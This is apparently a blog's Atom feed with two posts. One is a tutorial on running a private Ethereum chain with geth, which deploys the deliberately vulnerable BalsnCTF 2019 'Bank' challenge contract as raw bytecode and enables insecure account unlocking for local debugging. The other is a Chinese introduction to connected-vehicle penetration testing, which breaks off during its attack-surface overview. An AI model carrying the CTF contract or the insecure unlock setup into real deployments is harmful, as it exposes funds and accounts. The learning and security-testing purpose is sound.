<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SuperGate</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-05-14T02:45:13.918Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>SuperGate</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Construct Ethereum Private Chain and Debug Locally</title>
    <link href="http://example.com/2021/05/06/Construct%20Ethereum%20Private%20Chain%20and%20Debug%20Locally/Construct%20Ethereum%20Private%20Chain%20and%20Debug%20Locally/"/>
    <id>http://example.com/2021/05/06/Construct%20Ethereum%20Private%20Chain%20and%20Debug%20Locally/Construct%20Ethereum%20Private%20Chain%20and%20Debug%20Locally/</id>
    <published>2021-05-06T07:29:17.912Z</published>
    <updated>2021-05-14T02:45:13.918Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#references">References</a></li><li><a href="#installation">Installation</a></li><li><a href="#build-private-chain-by-geth">Build Private Chain by Geth</a></li><li><a href="#how-to-play-with-it">How to Play with it</a><ul><li><a href="#send-transaction">Send Transaction</a></li><li><a href="#deploy-a-contract">Deploy a Contract</a></li><li><a href="#to-be-continued">to be continued…</a></li></ul></li></ul><!-- tocstop --><h1><span id="references">References</span></h1><p><a href="https://blog.csdn.net/wo541075754/article/details/98847308">https://blog.csdn.net/wo541075754/article/details/98847308</a></p><p><a href="https://zhuanlan.zhihu.com/p/33865441">https://zhuanlan.zhihu.com/p/33865441</a></p><p><a href="https://learnblockchain.cn/2019/04/08/genesis">https://learnblockchain.cn/2019/04/08/genesis</a></p><p><a href="https://web3py.readthedocs.io/en/stable/">https://web3py.readthedocs.io/en/stable/</a></p><h1><span id="installation">Installation</span></h1><p>I’d like to install Ethereum from source, because it’s more easy and I can get the latest version.</p><p>According to the <code>README.md</code>, you may need to install Go (version 1.14 or later) and a C compiler first.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ethereum/go-ethereum.git</span><br><span class="line">cd go-ethereum</span><br><span class="line">make geth</span><br></pre></td></tr></table></figure><p>The output will be in <code>go-ethereum/build/bin/</code> by default.</p><p>If you want to install in a different way, please refer to <a href="https://geth.ethereum.org/docs/install-and-build/installing-geth">this</a>.</p><h1><span id="build-private-chain-by-geth">Build Private Chain by Geth</span></h1><p>We can modify the configuration of our own chain so that it will be more easy for us to debug the smart contract deployed and to trace each transaction.</p><p>We need to create a new directory to be the main workspace, and we need to create <code>genesis.json</code> in this directory before building the first block.</p><p><strong>genesis.json</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="attr">&quot;config&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;chainId&quot;</span>: <span class="number">15</span>,</span><br><span class="line">        <span class="attr">&quot;homesteadBlock&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;eip150Block&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;eip155Block&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;eip158Block&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;coinbase&quot;</span> : <span class="string">&quot;0x0000000000000000000000000000000000000000&quot;</span>, <span class="comment">// The address of the account that gets the reward by default</span></span><br><span class="line">    <span class="attr">&quot;difficulty&quot;</span> : <span class="string">&quot;0x1&quot;</span>, <span class="comment">// Difficulty of mining</span></span><br><span class="line">    <span class="attr">&quot;extraData&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;gasLimit&quot;</span> : <span class="string">&quot;0xffffffff&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;nonce&quot;</span> : <span class="string">&quot;0x0000000000000042&quot;</span>, <span class="comment">// Random number</span></span><br><span class="line">    <span class="attr">&quot;mixhash&quot;</span> : <span class="string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span>, <span class="comment">// Related to PoW</span></span><br><span class="line">    <span class="attr">&quot;parentHash&quot;</span> : <span class="string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span>, <span class="comment">// The parent node hash value. For the first block, it should be 0</span></span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span> : <span class="string">&quot;0x00&quot;</span>, <span class="comment">// UTC timestamp</span></span><br><span class="line">    <span class="attr">&quot;alloc&quot;</span>: &#123; &#125; <span class="comment">// When the blockchain is generated, these accounts are given certain assets in advance</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Run the command below to initialize.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --datadir &quot;./&quot; init genesis.json</span><br></pre></td></tr></table></figure><h1><span id="how-to-play-with-it">How to Play with it</span></h1><p>First we should notice that if we run the command like:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --datadir &quot;./&quot; --nodiscover --rpc --rpcaddr 127.0.0.1 --rpcport 7050 --rpcapi &quot;debug,eth,net,web3,miner,personal&quot; --networkid 10 console 2&gt;&gt;eth_log.log</span><br></pre></td></tr></table></figure><p>There will be error when we trying to unlock an account:</p><p>This is because in the new version of geth, to keep secure, the HTTP channel unlocking account is disabled by default. We can refer <a href="https://github.com/ethereum/go-ethereum/pull/17037">this issue</a> from github.</p><p>If we just want to debug on our private chain, this may work (simply adding <code>--allow-insecure-unlock</code>):</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --datadir &quot;./&quot; --nodiscover --rpc --rpcaddr 127.0.0.1 --rpcport 7050 --rpcapi &quot;debug,eth,net,web3,miner,personal&quot; --networkid 10 --allow-insecure-unlock  console 2&gt;&gt;eth_log.log</span><br></pre></td></tr></table></figure><h2><span id="send-transaction">Send Transaction</span></h2><p>We can try to create 2 accounts to make transaction.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> personal.newAccount(<span class="string">&quot;aaa&quot;</span>)</span></span><br><span class="line">&quot;0x5d31e74f0e52fe3fd58bd8079f84bc601a3f6d89&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> personal.newAccount(<span class="string">&quot;bbb&quot;</span>)</span></span><br><span class="line">&quot;0xd14a5c1ca1299d003284483b77b789e28a50741f&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> eth.accounts</span></span><br><span class="line">[&quot;0x5d31e74f0e52fe3fd58bd8079f84bc601a3f6d89&quot;, &quot;0xd14a5c1ca1299d003284483b77b789e28a50741f&quot;]</span><br></pre></td></tr></table></figure><p>Let’s presume that <code>0x5d31e74f0e52fe3fd58bd8079f84bc601a3f6d89</code> has some ethereum, so if he want to send his ethereum to another account, we should unlock first.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> personal.unlockAccount(eth.accounts[0])</span></span><br><span class="line">Unlock account 0x5d31e74f0e52fe3fd58bd8079f84bc601a3f6d89</span><br><span class="line">Passphrase:</span><br><span class="line">true</span><br></pre></td></tr></table></figure><p>Now we can try to send trasaction.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> eth.getBalance(eth.accounts[0])</span></span><br><span class="line">624999999999959999600</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> eth.getBalance(eth.accounts[1])</span></span><br><span class="line">40000400</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> eth.sendTransaction(&#123;from: eth.accounts[0], to: eth.accounts[1], value: 20000000&#125;)</span></span><br><span class="line">&quot;0xe8cba28afecd5d8516096ccce7e18ae186ceea9e3d40ae8411412c7dc34e9695&quot;</span><br></pre></td></tr></table></figure><p>Seems like it works! Let’s check their balance again:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> eth.getBalance(eth.accounts[0])</span></span><br><span class="line">624999999999959999600</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> eth.getBalance(eth.accounts[1])</span></span><br><span class="line">40000400</span><br></pre></td></tr></table></figure><p>It’s weird! Both balance don’t change at all!</p><p>Actually, the transaction do have been commited to the blockchain, but has not been handled:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> txpool.status</span></span><br><span class="line">&#123;</span><br><span class="line">  pending: 1,</span><br><span class="line">  queued: 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To make the transaction been processed, it must be mined. So we start mining, and then wait for a block to be mined, then stop mining.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> miner.start(1)</span></span><br><span class="line">null</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> eth.getBalance(eth.accounts[0])</span></span><br><span class="line">654999999999939999600</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> eth.getBalance(eth.accounts[1])</span></span><br><span class="line">60000400</span><br></pre></td></tr></table></figure><p>Done!</p><h2><span id="deploy-a-contract">Deploy a Contract</span></h2><p>Sometimes we need to deploy a smart contract on our own chain in order to debug, and we need to check a certain transaction detail after the transacton is done. It’s convenient for us to use the APIs from <code>web3py</code> to do them all.</p><p>Installing <code>web3py</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install web3</span><br></pre></td></tr></table></figure><p>In the entire Ethereum network, the service we start through <code>geth</code> can be called a <code>node</code>, and <code>rpc</code> (which we have already included in the starting command) protocol can be used to send RPC operations to the node, and to receive data from the nodes. Using <code>web3</code>, it can be simply like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&quot;http://127.0.0.1:7050&quot;</span>))</span><br><span class="line">print(w3.isConnected())</span><br></pre></td></tr></table></figure><p>In this case only, we use <code>http://127.0.0.1:7050</code> to connect to our node (just as the parameters <code>--rpc --rpcaddr 127.0.0.1 --rpcport 7050</code> stated). And if the output is <code>true</code>, we have successfully connected to our node.</p><p>There are more RPC methods to connect, according to the circumstances, you can choose one the most suitable for yourself:</p><ul><li>IPCProvider</li><li>HTTPProvider</li><li>Auto check</li><li>…</li></ul><p>And how can we deploy the contract on the node? Some APIs from <code>web3py</code> also work. First you need to compile your contract on <code>Remix</code> to get its <code>bytecode</code> and <code>ABI</code>. Using command <code>solc</code> in console to get them is also OK.</p><p>For instance, If we want to call a function from a contract, the python code should be like this (The solidity source code is from <a href="https://ainevsia.github.io/2021/03/22/balsnctf2019-bank/">BalsnCTF 2019 Bank</a>):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> web3.types <span class="keyword">import</span> TxReceipt</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&quot;http://127.0.0.1:7050&quot;</span>))</span><br><span class="line">w3.isConnected()</span><br><span class="line"></span><br><span class="line">_bytecode = <span class="string">&quot;0x60806040526001805534801561001457600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610b52806100646000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680631ec612411461005c5780638da5cb5b1461009d578063ed0242cf146100f4575b600080fd5b61009b60048036038101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff1916906020019092919050505061013f565b005b3480156100a957600080fd5b506100b26101c6565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b610129600480360381019080803573ffffffffffffffffffffffffffffffffffffffff191690602001909291905050506101eb565b6040518082815260200191505060405180910390f35b600060028381548110151561015057fe5b906000526020600020906002020190508060000160009054906101000a900460ff1615151561017e57600080fd5b6101a483838360000160019054906101000a900467ffffffffffffffff1663ffffffff16565b60018160000160006101000a81548160ff021916908315150217905550505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060008160000160006101000a81548160ff021916908315150217905550828160000160096101000a8154816bffffffffffffffffffffffff021916908374010000000000000000000000000000000000000000900402179055503481600101819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156102d8576104548160000160016101000a81548167ffffffffffffffff021916908367ffffffffffffffff160217905550610336565b670de0b6b3a764000034101515156102ef57600080fd5b662386f26fc1000081600101600082825403925050819055506107b38160000160016101000a81548167ffffffffffffffff021916908367ffffffffffffffff1602179055505b600281908060018154018082558091505090600182039060005260206000209060020201600090919290919091506000820160009054906101000a900460ff168160000160006101000a81548160ff0219169083151502179055506000820160019054906101000a900467ffffffffffffffff168160000160016101000a81548167ffffffffffffffff021916908367ffffffffffffffff1602179055506000820160099054906101000a900474010000000000000000000000000000000000000000028160000160096101000a8154816bffffffffffffffffffffffff0219169083740100000000000000000000000000000000000000009004021790555060018201548160010155505050600160028054905003915050919050565b8181600060028381548110151561046757fe5b906000526020600020906002020160000160099054906101000a9004740100000000000000000000000000000000000000000273ffffffffffffffffffffffffffffffffffffffff191682604051808273ffffffffffffffffffffffffffffffffffffffff191673ffffffffffffffffffffffffffffffffffffffff19168152600c01915050604051809103902073ffffffffffffffffffffffffffffffffffffffff19161415156106f557828160000181905550428160010181905550818160020160006101000a8154816bffffffffffffffffffffffff021916908374010000000000000000000000000000000000000000900402179055503281600201600c6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819080600181540180825580915050906001820390600052602060002090600302016000909192909190915060008201548160000155600182015481600101556002820160009054906101000a900474010000000000000000000000000000000000000000028160020160006101000a8154816bffffffffffffffffffffffff0219169083740100000000000000000000000000000000000000009004021790555060028201600c9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681600201600c6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050506107ac565b6a52b7d2dcc80cd2e4000000341015151561070f57600080fd5b7f2d3bd82a572c860ef85a36e8d4873a9deed3f76b9fddbf13fbe4fe8a97c4a57933604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390a16000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b5050505050565b818160006002838154811015156107c657fe5b906000526020600020906002020160000160099054906101000a9004740100000000000000000000000000000000000000000273ffffffffffffffffffffffffffffffffffffffff191682604051808273ffffffffffffffffffffffffffffffffffffffff191673ffffffffffffffffffffffffffffffffffffffff19168152600c01915050604051809103902073ffffffffffffffffffffffffffffffffffffffff1916141515610a5457828160000181905550428160010181905550818160020160006101000a8154816bffffffffffffffffffffffff021916908374010000000000000000000000000000000000000000900402179055503281600201600c6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819080600181540180825580915050906001820390600052602060002090600302016000909192909190915060008201548160000155600182015481600101556002820160009054906101000a900474010000000000000000000000000000000000000000028160020160006101000a8154816bffffffffffffffffffffffff0219169083740100000000000000000000000000000000000000009004021790555060028201600c9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681600201600c6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505050610b1f565b3373ffffffffffffffffffffffffffffffffffffffff166108fc600287815481101515610a7d57fe5b9060005260206000209060020201600101549081150290604051600060405180830381858888f19350505050158015610aba573d6000803e3d6000fd5b507f52a051bca553b0a466ddf55904bf9b9a11c8234e4b8c33f40bf79749a8df067033604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390a15b50505050505600a165627a7a72305820ae68ace0c29a463c9b37bcd9d83993367624020a5247116238bf07b4e209a5f10029&quot;</span></span><br><span class="line">_abi_json = <span class="string">&#x27;[&#123;&quot;constant&quot;: false,&quot;inputs&quot;: [&#123;&quot;name&quot;: &quot;idx&quot;,&quot;type&quot;: &quot;uint256&quot;&#125;,&#123;&quot;name&quot;: &quot;pass&quot;,&quot;type&quot;: &quot;bytes12&quot;&#125;],&quot;name&quot;: &quot;withdraw&quot;,&quot;outputs&quot;: [],&quot;payable&quot;: true,&quot;stateMutability&quot;: &quot;payable&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;constant&quot;: true,&quot;inputs&quot;: [],&quot;name&quot;: &quot;owner&quot;,&quot;outputs&quot;: [&#123;&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;address&quot;&#125;],&quot;payable&quot;: false,&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;constant&quot;: false,&quot;inputs&quot;: [&#123;&quot;name&quot;: &quot;hash&quot;,&quot;type&quot;: &quot;bytes12&quot;&#125;],&quot;name&quot;: &quot;deposit&quot;,&quot;outputs&quot;: [&#123;&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;uint256&quot;&#125;],&quot;payable&quot;: true,&quot;stateMutability&quot;: &quot;payable&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;payable&quot;: false,&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;constructor&quot;&#125;,&#123;&quot;anonymous&quot;: false,&quot;inputs&quot;: [&#123;&quot;indexed&quot;: false,&quot;name&quot;: &quot;addr&quot;,&quot;type&quot;: &quot;address&quot;&#125;],&quot;name&quot;: &quot;SendEther&quot;,&quot;type&quot;: &quot;event&quot;&#125;,&#123;&quot;anonymous&quot;: false,&quot;inputs&quot;: [&#123;&quot;indexed&quot;: false,&quot;name&quot;: &quot;addr&quot;,&quot;type&quot;: &quot;address&quot;&#125;],&quot;name&quot;: &quot;SendFlag&quot;,&quot;type&quot;: &quot;event&quot;&#125;]&#x27;</span></span><br><span class="line">_abi = json.loads(_abi_json)</span><br><span class="line"></span><br><span class="line">w3.geth.personal.unlockAccount(w3.eth.accounts[<span class="number">0</span>], <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">BalsnCTFContract = w3.eth.contract(abi=_abi, bytecode=_bytecode)</span><br><span class="line">txHash = BalsnCTFContract.constructor().transact(&#123;<span class="string">&#x27;from&#x27;</span>: w3.eth.accounts[<span class="number">0</span>], <span class="string">&#x27;gas&#x27;</span>: <span class="number">1000000</span>&#125;) <span class="comment"># The &#x27;from&#x27; key states the manager of the contract.</span></span><br><span class="line">txReceipt = w3.eth.waitForTransactionReceipt(txHash)</span><br><span class="line">print(txReceipt)</span><br><span class="line"></span><br><span class="line">bc = w3.eth.contract(address=txReceipt.contractAddress, abi=_abi)</span><br><span class="line">txHash = bc.functions.deposit(<span class="string">b&#x27;thisisahash&#x27;</span>).transact(&#123;<span class="string">&#x27;from&#x27;</span>: w3.eth.accounts[<span class="number">0</span>], <span class="string">&#x27;to&#x27;</span>:w3.eth.accounts[<span class="number">1</span>], <span class="string">&#x27;gas&#x27;</span>: <span class="number">10000000</span>, <span class="string">&#x27;value&#x27;</span>: w3.toWei(<span class="number">97</span>, <span class="string">&#x27;ether&#x27;</span>)&#125;) <span class="comment"># There cannot be too much ether for the transaction, otherwise an error will be reported.</span></span><br><span class="line">txReceipt = w3.eth.waitForTransactionReceipt(txHash)</span><br><span class="line">print(txReceipt)</span><br></pre></td></tr></table></figure><p>However if we try to run it, the program seems to be suspended. Remember what we talk about in the previous chapter? Only if there is at least one node minning, the transaction would be handled. So all we need is just to mine one block like this:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">miner.start(1); admin.sleepBlocks(1); miner.stop();</span><br></pre></td></tr></table></figure><p>At last the execution result will be like this:</p><p>We can see that after the execution of <code>BalsnCTFContract.constructor()</code>, a <code>contractAddress</code> will be returned for users to locate the contract, and further more, we can use the address to call a function from the contract without deploying the contract again.</p><h2><span id="to-be-continued">to be continued…</span></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#references&quot;&gt;References&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#installation&quot;&gt;Installation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#build-priva</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>车联网安全入门总结</title>
    <link href="http://example.com/2021/04/06/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2021/04/06/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93/</id>
    <published>2021-04-06T06:20:50.353Z</published>
    <updated>2021-04-07T08:12:25.259Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这篇文章主要介绍了自己在学习车联网安全渗透时从无到有的一系列过程，会从比较基础的车联网体系框架谈起。在自己的学习过程中并没有发现总结的比较全面且实用性强的入门总结，这让我前期测试时走了许多弯路，因此本篇的重点也会体现在各种场景下的实际操作。十分感谢同组导师和组员们在学习过程中的答疑解惑。:)</p></blockquote><!-- toc --><ul><li><a href="#%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BB%93%E6%9E%84%E7%AE%80%E8%BF%B0">车联网安全结构简述</a><ul><li><a href="#tsp-%E4%BA%91%E7%AB%AF">TSP 云端</a></li><li><a href="#hu">HU</a></li><li><a href="#tbox">TBOX</a></li><li><a href="#%E7%94%A8%E6%88%B7%E7%A7%BB%E5%8A%A8%E7%BB%88%E7%AB%AF">用户移动终端</a></li></ul></li><li><a href="#%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90">攻击面分析</a><ul><li><a href="#%E7%94%A8%E6%88%B7%E7%A7%BB%E5%8A%A8%E7%BB%88%E7%AB%AF%E6%94%BB%E5%87%BB%E9%9D%A2">用户移动终端攻击面</a></li><li><a href="#hu-%E6%94%BB%E5%87%BB%E9%9D%A2">HU 攻击面</a></li><li><a href="#tbox-%E6%94%BB%E5%87%BB%E9%9D%A2">TBOX 攻击面</a></li><li><a href="#tsp-%E4%BA%91%E7%AB%AF%E6%94%BB%E5%87%BB%E9%9D%A2">TSP 云端攻击面</a></li></ul></li><li><a href="#%E6%B5%8B%E8%AF%95%E6%AD%A5%E9%AA%A4%E5%8F%8A%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98">测试步骤及遇到的问题</a><ul><li><a href="#%E6%89%8B%E6%9C%BA-app-%E6%B5%8B%E8%AF%95">手机 APP 测试</a><ul><li><a href="#%E8%84%B1%E5%A3%B3">脱壳</a></li><li><a href="#%E5%AE%89%E5%8D%93%E6%8A%93%E5%8C%85">安卓抓包</a></li><li><a href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95">动态调试</a></li><li><a href="#%E9%87%8D%E6%94%BE">重放</a></li></ul></li><li><a href="#hu-%E5%BA%94%E7%94%A8%E6%B5%8B%E8%AF%95">HU 应用测试</a><ul><li><a href="#hu-%E6%8A%93%E5%8C%85">HU 抓包</a></li></ul></li><li><a href="#tbox-%E6%B5%8B%E8%AF%95">TBOX 测试</a></li></ul></li><li><a href="#%E6%80%BB%E7%BB%93">总结</a></li></ul><!-- tocstop --><p><em>本文主要涉及到的是威马汽车安全渗透测试的一些经验。其他车型可能会有较多变动，但是整体结构和测试方法可以举一反三。</em></p><h1><span id="车联网安全结构简述">车联网安全结构简述</span></h1><p><strong>车联网</strong>即车辆物联网 (IoV)，旨在通过车载设备实时收集车辆动态信息，并在车辆运行中提供各种功能服务。更具体地来说，车联网的存在提供了车辆和云端服务器、用户移动终端和其他车辆的通信功能，从而能够提供更精确的车辆导航和信息监控、用户远程控车等复杂但便捷的功能。</p><p>在进行车联网安全渗透测试时，我们可以将整个体系结构简化为下图：</p><p><img src="pic1.png" alt="pic1"></p><p>通过分析图中的各个组成成分，我们可以比较清晰地分析出车辆存在的攻击面，以及可能的攻击方式。</p><h2><span id="tsp-云端">TSP 云端</span></h2><p><strong>TSP (Telematics Service Provider)</strong> 即汽车远程服务提供商。该部分可看作为一个云端服务器，并给车辆提供一些必要接口。车辆的一些实时信息比如位置信息，空调开关情况等都会上传给 TSP。</p><h2><span id="hu">HU</span></h2><p><strong>HU</strong> 即车载娱乐信息系统，是车辆控制和娱乐应用一体化的智能多媒体设备。</p><p>面向用户的一侧多为 Android 系统，提供了导航、视频播放等功能。车机中的 MCU 芯片使得车机可以通过 CAN 总线接入 CAN 网络进行车控，同时车机也可以通过 Wifi、蓝牙等来和用户的手机进行连接。一般会提供 USB 接口供调试。</p><h2><span id="tbox">TBOX</span></h2><p><strong>TBOX</strong> 是和 TSP 云端以及用户手机通信的主要部分，可以通过蜂窝网络与 TSP 云端进行通信。TBOX 通过 Ethernet-over-USB 方式共享一个局域网络，同时也有 MCU 芯片，能够接入 CAN 网络。</p><h2><span id="用户移动终端">用户移动终端</span></h2><p>多为用户手机。在下载了车厂指定的 APP 后绑定账号和车辆，即可通过该 APP 进行车辆的控制等。</p><h1><span id="攻击面分析">攻击面分析</span></h1><p>本节会对上述结构中每个成分容易受到攻击的部分进行分析，以及阐述该从哪些方向进行重点测试。</p><h2><span id="用户移动终端攻击面">用户移动终端攻击面</span></h2><p>用户移动终端存在的攻击面主要存在于车厂指定的手机 APP 中。在测试时我们会重点关注 APP 本身的安全性，这其中包括但不限于通信安全和应用安全。</p><p>考虑到用户手机端无法像车内设备和 TSP 云端一样能够设置较高的保护措施，可以从一下几个方面进行攻击测试：</p><ul><li>APP 应用本身的漏洞</li><li>数据包窃取和伪造（这其中包括 PKI 身份认证系统）</li><li>完整性检查绕过</li></ul><p>我们重点分析车厂本身实现的安卓层和 native 层代码。</p><h2><span id="hu-攻击面">HU 